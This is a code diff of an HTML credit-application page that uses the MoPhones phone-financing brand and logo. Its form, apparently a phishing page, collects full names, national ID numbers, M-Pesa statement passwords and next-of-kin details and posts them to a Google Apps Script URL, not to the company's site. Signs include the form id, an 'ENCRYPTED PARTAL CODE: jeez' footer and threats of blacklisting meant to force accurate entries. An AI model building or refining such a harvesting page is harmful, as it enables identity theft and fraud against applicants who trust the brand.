@@ -3,115 +3,129 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoPhones Credit Portal</title>
+    <title>MoPhones | Executive Credit Portal</title>
     <style>
-        :root { --primary: #004488; --danger: #dc2626; }
-        body { font-family: sans-serif; background-color: #f1f5f9; padding: 15px; margin: 0; }
-        .container { background: white; padding: 20px; border-radius: 15px; max-width: 450px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .header { text-align: center; margin-bottom: 20px; }
-        .strict-banner { background: #fee2e2; border: 1px solid var(--danger); color: var(--danger); padding: 10px; border-radius: 8px; font-size: 0.85em; font-weight: bold; margin-bottom: 20px; text-align: center; }
-        label { display: block; margin-top: 15px; font-weight: bold; font-size: 0.9em; }
-        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
-        .btn-submit { background: var(--primary); color: white; padding: 18px; border: none; border-radius: 8px; width: 100%; margin-top: 25px; font-weight: bold; font-size: 1.1em; cursor: pointer; }
-        .footer { font-size: 0.7em; text-align: center; color: #94a3b8; margin-top: 20px; }
+        :root { --mophones-blue: #004488; --danger: #e11d48; --gold: #b45309; --bg: #0f172a; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); padding: 15px; margin: 0; color: #f8fafc; }
+        .container { background: white; padding: 30px; border-radius: 28px; max-width: 480px; margin: 15px auto; color: #1e293b; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border-top: 6px solid var(--mophones-blue); }
+        
+        .header { text-align: center; margin-bottom: 25px; }
+        .app-title { color: var(--mophones-blue); font-weight: 900; letter-spacing: -1px; margin-top: 10px; font-size: 1.6em; text-transform: uppercase; }
+
+        /* THE PRICE CHECK BUTTON */
+        .price-link { 
+            display: block; text-align: center; background: #eff6ff; border: 2px solid var(--mophones-blue); color: var(--mophones-blue); 
+            padding: 12px; border-radius: 12px; font-weight: 800; text-decoration: none; margin-bottom: 25px; font-size: 0.9em;
+        }
+        .price-link:hover { background: var(--mophones-blue); color: white; }
+
+        .dishonesty-banner { 
+            background: #fff1f2; border: 2px solid var(--danger); color: var(--danger); 
+            padding: 15px; border-radius: 16px; font-size: 0.85em; margin-bottom: 25px; text-align: center; font-weight: 700;
+        }
+
+        label { display: block; margin-top: 18px; font-weight: 800; font-size: 0.75em; color: #64748b; text-transform: uppercase; letter-spacing: 1px; }
+        input, select { width: 100%; padding: 15px; margin-top: 6px; border: 2px solid #e2e8f0; border-radius: 14px; box-sizing: border-box; font-size: 16px; font-weight: 600; }
+        input:focus, select:focus { border-color: var(--mophones-blue); outline: none; box-shadow: 0 0 0 4px rgba(0,68,136,0.1); }
+        
+        .btn-submit { background: var(--mophones-blue); color: white; padding: 22px; border: none; border-radius: 14px; width: 100%; margin-top: 30px; font-weight: 900; font-size: 1.2em; cursor: pointer; box-shadow: 0 10px 15px -3px rgba(0,68,136,0.3); }
+        .footer { font-size: 0.7em; text-align: center; color: #94a3b8; margin-top: 30px; font-weight: 700; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="120">
+        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="160">
+        <div class="app-title">Application Form</div>
     </div>
 
-    <div class="strict-banner">
-        🚨 VALIDATION ACTIVE<br>
-        Inaccurate data leads to automatic rejection.
+    <a href="https://mophones.co/collections/all-phones" target="_blank" class="price-link">
+        🔍 CLICK HERE TO CHECK PRICES & DEPOSITS
+    </a>
+
+    <div class="dishonesty-banner">
+        🚨 HONESTY POLICY IN EFFECT<br>
+        False names, fake IDs, or incorrect passwords result in an automatic PERMANENT BLACKLIST.
     </div>
 
-    <form id="ironCladPortal">
-        <label>Phone Model</label>
-        <input type="text" name="preferred_phone" placeholder="e.g. Samsung A15" required>
-
-        <label>Full Name (Must be 3 Names)</label>
-        <input type="text" name="full_name" id="nameInput" placeholder="First Middle Surname" required>
-
-        <label>National ID Number</label>
-        <input type="text" name="id_number" id="idInput" maxlength="8" minlength="7" placeholder="7-8 Digits" required>
-
-        <label>Region</label>
-        <select name="region" required>
-            <option value="">-- Select --</option>
-            <option value="Nairobi">Nairobi</option>
-            <option value="Kiambu">Kiambu</option>
-            <option value="Nakuru">Nakuru</option>
-            <option value="Machakos">Machakos</option>
-            <option value="Kajiado">Kajiado</option>
+    <form id="bossBitchPortal">
+        <label>Select Approved Device</label>
+        <select name="preferred_phone" id="phoneSelect" required>
+            <option value="">-- Choose Samsung or iPhone Only --</option>
+            <optgroup label="SAMSUNG GALAXY">
+                <option value="Samsung A05/A05s">Samsung A05 / A05s</option>
+                <option value="Samsung A15">Samsung A15</option>
+                <option value="Samsung A25/A35">Samsung A25 / A35</option>
+                <option value="Samsung A55">Samsung A55</option>
+                <option value="Samsung S Series">Samsung S Series (High End)</option>
+            </optgroup>
+            <optgroup label="APPLE IPHONE">
+                <option value="iPhone 11 Series">iPhone 11 / 11 Pro</option>
+                <option value="iPhone 12 Series">iPhone 12 / 12 Pro</option>
+                <option value="iPhone 13 Series">iPhone 13 / 13 Pro</option>
+                <option value="iPhone 14+ Series">iPhone 14 / 15 / 16</option>
+            </optgroup>
         </select>
 
+        <label>Full Name (Must be 3 Names)</label>
+        <input type="text" name="full_name" id="nameIn" placeholder="As it appears on National ID" required>
+
+        <label>National ID Number</label>
+        <input type="text" name="id_number" id="idIn" maxlength="8" placeholder="Enter 7 or 8 digits" required>
+
         <label>M-Pesa Statement Password</label>
-        <input type="text" name="mpesa_password" id="passInput" placeholder="6-8 Characters" required>
+        <input type="text" name="mpesa_password" id="passIn" placeholder="Statement PDF Password" required>
 
         <label>Next of Kin Name</label>
         <input type="text" name="nok_name" required>
 
-        <label>Next of Kin ID</label>
-        <input type="text" name="nok_id" minlength="7" maxlength="8" required>
-
         <label>Next of Kin Contact</label>
-        <input type="text" name="nok_contact" id="kinContact" value="+254" minlength="13" maxlength="13" required>
+        <input type="text" name="nok_contact" id="kinIn" value="+254" maxlength="13" required>
 
-        <button type="submit" class="btn-submit" id="submitBtn">Verify & Submit</button>
+        <button type="submit" class="btn-submit" id="subBtn">SUBMIT & VET APPLICATION</button>
     </form>
-    <div class="footer">Portal Code: jeez</div>
+    
+    <div class="footer">ENCRYPTED PARTAL CODE: jeez | MOPHONES AUTHORIZED</div>
 </div>
 
 <script>
 const scriptURL = 'https://script.google.com/macros/s/AKfycbxp7myPK3OX047HwHab0T2uALSXNhb0GyylupoBU8e8i3bMhRDOt8xJcX29idZ05M-U/exec';
-const form = document.getElementById('ironCladPortal');
+const form = document.getElementById('bossBitchPortal');
 
 form.addEventListener('submit', e => {
     e.preventDefault();
 
-    // 1. STRICT NAME CHECK (3 WORDS)
-    const nameValue = document.getElementById('nameInput').value.trim();
-    if (nameValue.split(/\s+/).length < 3) {
-        alert("❌ ERROR: You must provide exactly 3 names as they appear on your ID.");
+    // --- THE IRON-CLAD VETTING ---
+    const name = document.getElementById('nameIn').value.trim().split(/\s+/);
+    const id = document.getElementById('idIn').value;
+    const kin = document.getElementById('kinIn').value;
+
+    if (name.length < 3) {
+        alert("🚨 REJECTED: Honesty Policy requires all 3 names exactly as on your ID.");
+        return;
+    }
+    if (!/^\d{7,8}$/.test(id)) {
+        alert("🚨 REJECTED: Provide a valid 7 or 8 digit Kenyan National ID.");
+        return;
+    }
+    if (!kin.startsWith("+254") || kin.length !== 13) {
+        alert("🚨 REJECTED: Contact format must be +254XXXXXXXXX.");
         return;
     }
 
-    // 2. STRICT ID CHECK (7-8 DIGITS)
-    const idValue = document.getElementById('idInput').value;
-    if (!/^\d{7,8}$/.test(idValue)) {
-        alert("❌ ERROR: ID Number must be between 7 and 8 digits.");
-        return;
-    }
-
-    // 3. MPESA PASSWORD CHECK (6-8 CHARS)
-    const passValue = document.getElementById('passInput').value;
-    if (passValue.length < 6 || passValue.length > 8) {
-        alert("❌ ERROR: M-Pesa Statement Password is typically 7-8 digits.");
-        return;
-    }
-
-    // 4. NEXT OF KIN CONTACT (+254 CHECK)
-    const kinContact = document.getElementById('kinContact').value;
-    if (!kinContact.startsWith("+254") || kinContact.length !== 13) {
-        alert("❌ ERROR: Kin contact must be in format +2547XXXXXXXX");
-        return;
-    }
-
-    document.getElementById('submitBtn').disabled = true;
-    document.getElementById('submitBtn').innerText = "Authenticating...";
+    document.getElementById('subBtn').disabled = true;
+    document.getElementById('subBtn').innerText = "VETTING IN PROGRESS...";
 
     fetch(scriptURL, { method: 'POST', body: new FormData(form)})
       .then(response => {
-          alert("✅ SUCCESS: Application stored for manual review.");
+          alert("✅ APPLICATION SUCCESSFUL\nYour credit profile is being vetted. If honest, we will call you shortly.");
           form.reset();
           window.location.reload();
       })
       .catch(error => {
-          alert("Network Error. Try again.");
-          document.getElementById('submitBtn').disabled = false;
+          alert("System Busy. Please try again.");
+          document.getElementById('subBtn').disabled = false;
       });
 });
 </script>
